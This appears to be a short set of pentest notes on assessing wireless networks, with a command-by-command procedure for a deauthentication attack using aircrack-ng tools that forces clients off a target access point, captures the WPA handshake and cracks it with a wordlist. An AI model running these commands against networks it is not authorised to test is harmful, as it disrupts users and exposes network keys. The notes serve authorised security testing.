# Wireless Pentest

## Assessment of wireless network

  - WPA2 / WPA3
  
  - PSK or Enterprise
  

## Activities performed

  - Evaluate strength of key
  
  - Review of nearby networks
   
      - rouge networks / suspicious 
      
  - Accessing aspects of networks from certain networks / segmentation
  
       - i.e Guest network should not have access to corperate devices
       
 
## Process for deauth attack

 1. Place wireless car into monitor mode
 
        iwconfig  # check interfaces
        
        airmon-ng check kill #Kill interfering processes
        
        airmon-ng start <wireless int>
 
 2. Discover info about channel and BSSID
 
        airodump-ng <wireless int>mon
 
       Here you want to find the BSSID you want to attack and the channel its on. 
 
 3. Select network and capture data
 
                
        airodump -c <channel> --bssid <BSSID> -w <output filename> <Wireless int>mon
        
      You will now only see traffic and clients connected to that BSSID. 
      
      You can wait around for clients to perform the handshake or you can deauth the client off and make them redo it.
 
 4. Perform deauth attack
 
       In a new terminial
       
        aireplay -0 1 -a <BSSID> -c <CLIENT MAC> <wireless int>mon
 
 5. Capture WPA handshake
 
       Watch the airodump terminal for "WPA handshake captured". Then you can stop the dump.
 
 6. Attempt to crack the handshake
 
       You can use aircrack-ng or [hashcat](https://github.com/Kahvi-0/Tools-and-Concepts/blob/master/Cracking/Hashcat.md)

        aircrack-ng -w <wordlist> -b <BSSID> <capture file>
